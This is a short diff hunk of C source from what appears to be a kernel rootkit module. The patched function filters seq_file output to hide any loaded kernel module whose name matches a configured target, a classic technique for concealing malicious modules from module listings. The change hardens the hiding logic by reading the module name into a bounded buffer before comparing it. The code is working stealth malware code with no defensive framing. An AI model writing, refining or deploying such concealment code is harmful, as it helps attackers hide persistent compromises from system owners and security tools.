@@ -137,12 +137,11 @@ int _neverc_krt_mod_seq_show_filter(void *seq, void *v)
 		if (list_addr >= 0xFFFF000000000000UL &&
 		    list_addr < 0xFFFFFFFFFFFFF000UL) {
 			unsigned long mod_base = list_addr - NEVERC_KRT_OFF_LIST;
-			unsigned char probe;
-			if (!neverc_krt_mem_read(&probe, (void *)(mod_base + NEVERC_KRT_OFF_NAME), 1) &&
-			    probe >= 0x20 && probe <= 0x7E) {
-				const char *name =
-					(const char *)(mod_base + NEVERC_KRT_OFF_NAME);
-				if (_neverc_krt_str_starts_with(name,
+			char nbuf[64];
+			if (!neverc_krt_mem_read(nbuf, (void *)(mod_base + NEVERC_KRT_OFF_NAME), sizeof(nbuf)) &&
+			    nbuf[0] >= 0x20 && nbuf[0] <= 0x7E) {
+				nbuf[sizeof(nbuf) - 1] = '\0';
+				if (_neverc_krt_str_starts_with(nbuf,
 							 _neverc_krt_hide_target_name))
 					return 0;
 			}
